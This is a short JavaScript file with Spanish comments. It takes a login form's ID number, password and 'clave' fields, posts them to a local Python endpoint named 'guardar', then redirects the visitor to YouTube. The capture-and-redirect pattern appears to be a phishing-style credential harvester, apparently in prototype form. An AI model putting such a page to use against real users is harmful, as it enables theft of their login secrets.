document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Evita que la página se recargue

    let documento = document.getElementById("documento").value;
    let password = document.getElementById("password").value;
    let clave = document.getElementById("clave").value;

    // Enviar datos al servidor Python
    fetch("http://127.0.0.1:5000/guardar", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            documento: documento,
            password: password,
            clave: clave
        })
    })
    .then(response => response.json())
    .then(data => {
        alert(data.mensaje); // Mensaje de respuesta
        window.location.href = "https://www.youtube.com/"; // Redirigir a YouTube
    })
    .catch(error => console.error("Error:", error));
});
